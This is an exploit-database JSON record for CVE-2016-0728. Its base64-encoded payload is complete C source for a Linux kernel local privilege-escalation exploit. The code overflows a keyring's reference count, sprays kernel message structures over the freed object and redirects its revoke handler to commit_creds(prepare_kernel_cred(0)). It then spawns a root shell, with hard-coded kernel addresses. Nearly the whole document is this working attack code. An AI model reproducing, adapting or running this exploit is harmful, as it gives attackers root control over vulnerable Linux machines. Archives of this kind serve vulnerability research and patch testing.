{
    "source": "exploit-database", 
    "exploit": "LyoNCiMgRXhwbG9pdCBUaXRsZTogTGludXgga2VybmVsIFJFRkNPVU5UIG92ZXJmbG93L1VzZS1BZnRlci1GcmVlIGluIGtleXJpbmdzDQojIERhdGU6IDE5LzEvMjAxNg0KIyBFeHBsb2l0IEF1dGhvcjogUGVyY2VwdGlvbiBQb2ludCBUZWFtDQojIENWRSA6IENWRS0yMDE2LTA3MjgNCiovDQoNCi8qICQgZ2NjIGN2ZV8yMDE2XzA3MjguYyAtbyBjdmVfMjAxNl8wNzI4IC1sa2V5dXRpbHMgLVdhbGwgKi8NCi8qICQgLi9jdmVfMjAxNl8wNzIgUFBfS0VZICovDQoNCi8qIEVEQi1Ob3RlOiBNb3JlIGluZm9ybWF0aW9uIH4gaHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8gKi8NCg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8a2V5dXRpbHMuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDx0aW1lLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQoNCiNpbmNsdWRlIDxzeXMvaXBjLmg+DQojaW5jbHVkZSA8c3lzL21zZy5oPg0KDQp0eXBlZGVmIGludCBfX2F0dHJpYnV0ZV9fKChyZWdwYXJtKDMpKSkgKCogX2NvbW1pdF9jcmVkcykodW5zaWduZWQgbG9uZyBjcmVkKTsNCnR5cGVkZWYgdW5zaWduZWQgbG9uZyBfX2F0dHJpYnV0ZV9fKChyZWdwYXJtKDMpKSkgKCogX3ByZXBhcmVfa2VybmVsX2NyZWQpKHVuc2lnbmVkIGxvbmcgY3JlZCk7DQpfY29tbWl0X2NyZWRzIGNvbW1pdF9jcmVkczsNCl9wcmVwYXJlX2tlcm5lbF9jcmVkIHByZXBhcmVfa2VybmVsX2NyZWQ7DQoNCiNkZWZpbmUgU1RSVUNUX0xFTiAoMHhiOCAtIDB4MzApDQojZGVmaW5lIENPTU1JVF9DUkVEU19BRERSICgweGZmZmZmZmZmODEwOTQyNTApDQojZGVmaW5lIFBSRVBBUkVfS0VSTkVMX0NSRURTX0FERFIgKDB4ZmZmZmZmZmY4MTA5NDU1MCkNCg0KDQoNCnN0cnVjdCBrZXlfdHlwZSB7DQogICAgY2hhciAqIG5hbWU7DQogICAgc2l6ZV90IGRhdGFsZW47DQogICAgdm9pZCAqIHZldF9kZXNjcmlwdGlvbjsNCiAgICB2b2lkICogcHJlcGFyc2U7DQogICAgdm9pZCAqIGZyZWVfcHJlcGFyc2U7DQogICAgdm9pZCAqIGluc3RhbnRpYXRlOw0KICAgIHZvaWQgKiB1cGRhdGU7DQogICAgdm9pZCAqIG1hdGNoX3ByZXBhcnNlOw0KICAgIHZvaWQgKiBtYXRjaF9mcmVlOw0KICAgIHZvaWQgKiByZXZva2U7DQogICAgdm9pZCAqIGRlc3Ryb3k7DQp9Ow0KDQp2b2lkIHVzZXJzcGFjZV9yZXZva2Uodm9pZCAqIGtleSkgew0KICAgIGNvbW1pdF9jcmVkcyhwcmVwYXJlX2tlcm5lbF9jcmVkKDApKTsNCn0NCg0KaW50IG1haW4oaW50IGFyZ2MsIGNvbnN0IGNoYXIgKmFyZ3ZbXSkgew0KCWNvbnN0IGNoYXIgKmtleXJpbmdfbmFtZTsNCglzaXplX3QgaSA9IDA7DQogICAgdW5zaWduZWQgbG9uZyBpbnQgbCA9IDB4MTAwMDAwMDAwLzI7DQoJa2V5X3NlcmlhbF90IHNlcmlhbCA9IC0xOw0KCXBpZF90IHBpZCA9IC0xOw0KICAgIHN0cnVjdCBrZXlfdHlwZSAqIG15X2tleV90eXBlID0gTlVMTDsNCiAgICANCnN0cnVjdCB7IGxvbmcgbXR5cGU7DQoJCWNoYXIgbXRleHRbU1RSVUNUX0xFTl07DQoJfSBtc2cgPSB7MHg0MTQxNDE0MTQxNDE0MTQxLCB7MH19Ow0KCWludCBtc3FpZDsNCg0KCWlmIChhcmdjICE9IDIpIHsNCgkJcHV0cygidXNhZ2U6IC4va2V5cyA8a2V5X25hbWU+Iik7DQoJCXJldHVybiAxOw0KCX0NCg0KICAgIHByaW50ZigidWlkPSVkLCBldWlkPSVkXG4iLCBnZXR1aWQoKSwgZ2V0ZXVpZCgpKTsgDQogICAgY29tbWl0X2NyZWRzID0gKF9jb21taXRfY3JlZHMpIENPTU1JVF9DUkVEU19BRERSOw0KICAgIHByZXBhcmVfa2VybmVsX2NyZWQgPSAoX3ByZXBhcmVfa2VybmVsX2NyZWQpIFBSRVBBUkVfS0VSTkVMX0NSRURTX0FERFI7DQogICAgDQogICAgbXlfa2V5X3R5cGUgPSBtYWxsb2Moc2l6ZW9mKCpteV9rZXlfdHlwZSkpOw0KDQogICAgbXlfa2V5X3R5cGUtPnJldm9rZSA9ICh2b2lkKil1c2Vyc3BhY2VfcmV2b2tlOw0KICAgIG1lbXNldChtc2cubXRleHQsICdBJywgc2l6ZW9mKG1zZy5tdGV4dCkpOw0KDQogICAgLy8ga2V5LT51aWQNCiAgICAqKGludCopKCZtc2cubXRleHRbNTZdKSA9IDB4M2U4OyAvKiBnZXRldWlkKCkgKi8NCiAgICAvL2tleS0+cGVybQ0KICAgICooaW50KikoJm1zZy5tdGV4dFs2NF0pID0gMHgzZjNmM2YzZjsNCg0KICAgIC8va2V5LT50eXBlDQogICAgKih1bnNpZ25lZCBsb25nICopKCZtc2cubXRleHRbODBdKSA9ICh1bnNpZ25lZCBsb25nKW15X2tleV90eXBlOw0KDQogICAgaWYgKChtc3FpZCA9IG1zZ2dldChJUENfUFJJVkFURSwgMDY0NCB8IElQQ19DUkVBVCkpID09IC0xKSB7DQogICAgICAgIHBlcnJvcigibXNnZ2V0Iik7DQogICAgICAgIGV4aXQoMSk7DQogICAgfQ0KDQogICAga2V5cmluZ19uYW1lID0gYXJndlsxXTsNCg0KCS8qIFNldCB0aGUgbmV3IHNlc3Npb24ga2V5cmluZyBiZWZvcmUgd2Ugc3RhcnQgKi8NCg0KCXNlcmlhbCA9IGtleWN0bChLRVlDVExfSk9JTl9TRVNTSU9OX0tFWVJJTkcsIGtleXJpbmdfbmFtZSk7DQoJaWYgKHNlcmlhbCA8IDApIHsNCgkJcGVycm9yKCJrZXljdGwiKTsNCgkJcmV0dXJuIC0xOw0KICAgIH0NCgkNCglpZiAoa2V5Y3RsKEtFWUNUTF9TRVRQRVJNLCBzZXJpYWwsIEtFWV9QT1NfQUxMIHwgS0VZX1VTUl9BTEwgfCBLRVlfR1JQX0FMTCB8IEtFWV9PVEhfQUxMKSA8IDApIHsNCgkJcGVycm9yKCJrZXljdGwiKTsNCgkJcmV0dXJuIC0xOw0KCX0NCg0KDQoJcHV0cygiSW5jcmVmaW5nLi4uIik7DQogICAgZm9yIChpID0gMTsgaSA8IDB4ZmZmZmZmZmQ7IGkrKykgew0KICAgICAgICBpZiAoaSA9PSAoMHhmZmZmZmZmZiAtIGwpKSB7DQogICAgICAgICAgICBsID0gbC8yOw0KICAgICAgICAgICAgc2xlZXAoNSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGtleWN0bChLRVlDVExfSk9JTl9TRVNTSU9OX0tFWVJJTkcsIGtleXJpbmdfbmFtZSkgPCAwKSB7DQogICAgICAgICAgICBwZXJyb3IoImtleWN0bCIpOw0KICAgICAgICAgICAgcmV0dXJuIC0xOw0KICAgICAgICB9DQogICAgfQ0KICAgIHNsZWVwKDUpOw0KICAgIC8qIGhlcmUgd2UgYXJlIGdvaW5nIHRvIGxlYWsgdGhlIGxhc3QgcmVmZXJlbmNlcyB0byBvdmVyZmxvdyAqLw0KICAgIGZvciAoaT0wOyBpPDU7ICsraSkgew0KICAgICAgICBpZiAoa2V5Y3RsKEtFWUNUTF9KT0lOX1NFU1NJT05fS0VZUklORywga2V5cmluZ19uYW1lKSA8IDApIHsNCiAgICAgICAgICAgIHBlcnJvcigia2V5Y3RsIik7DQogICAgICAgICAgICByZXR1cm4gLTE7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBwdXRzKCJmaW5pc2hlZCBpbmNyZWZpbmciKTsNCiAgICBwdXRzKCJmb3JraW5nLi4uIik7DQogICAgLyogYWxsb2NhdGUgbXNnIHN0cnVjdCBpbiB0aGUga2VybmVsIHJld3JpdGluZyB0aGUgZnJlZWQga2V5cmluZyBvYmplY3QgKi8NCiAgICBmb3IgKGk9MDsgaTw2NDsgaSsrKSB7DQogICAgICAgIHBpZCA9IGZvcmsoKTsNCiAgICAgICAgaWYgKHBpZCA9PSAtMSkgew0KICAgICAgICAgICAgcGVycm9yKCJmb3JrIik7DQogICAgICAgICAgICByZXR1cm4gLTE7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAocGlkID09IDApIHsNCiAgICAgICAgICAgIHNsZWVwKDIpOw0KICAgICAgICAgICAgaWYgKChtc3FpZCA9IG1zZ2dldChJUENfUFJJVkFURSwgMDY0NCB8IElQQ19DUkVBVCkpID09IC0xKSB7DQogICAgICAgICAgICAgICAgcGVycm9yKCJtc2dnZXQiKTsNCiAgICAgICAgICAgICAgICBleGl0KDEpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZm9yIChpID0gMDsgaSA8IDY0OyBpKyspIHsNCiAgICAgICAgICAgICAgICBpZiAobXNnc25kKG1zcWlkLCAmbXNnLCBzaXplb2YobXNnLm10ZXh0KSwgMCkgPT0gLTEpIHsNCiAgICAgICAgICAgICAgICAgICAgcGVycm9yKCJtc2dzbmQiKTsNCiAgICAgICAgICAgICAgICAgICAgZXhpdCgxKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBzbGVlcCgtMSk7DQogICAgICAgICAgICBleGl0KDEpOw0KICAgICAgICB9DQogICAgfQ0KICAgDQogICAgcHV0cygiZmluaXNoZWQgZm9ya2luZyIpOw0KICAgIHNsZWVwKDUpOw0KDQogICAgLyogY2FsbCB1c2Vyc3BhY2VfcmV2b2tlIGZyb20ga2VybmVsICovDQogICAgcHV0cygiY2FsaW5nIHJldm9rZS4uLiIpOw0KICAgIGlmIChrZXljdGwoS0VZQ1RMX1JFVk9LRSwgS0VZX1NQRUNfU0VTU0lPTl9LRVlSSU5HKSA9PSAtMSkgew0KICAgICAgICBwZXJyb3IoImtleWN0bF9yZXZva2UiKTsNCiAgICB9DQoNCiAgICBwcmludGYoInVpZD0lZCwgZXVpZD0lZFxuIiwgZ2V0dWlkKCksIGdldGV1aWQoKSk7DQogICAgZXhlY2woIi9iaW4vc2giLCAiL2Jpbi9zaCIsIE5VTEwpOw0KDQogICAgcmV0dXJuIDA7DQp9", 
    "filename": "platforms/linux/local/39277.c", 
    "id": "39277", 
    "cves": [
        "CVE-2016-0728"
    ]
}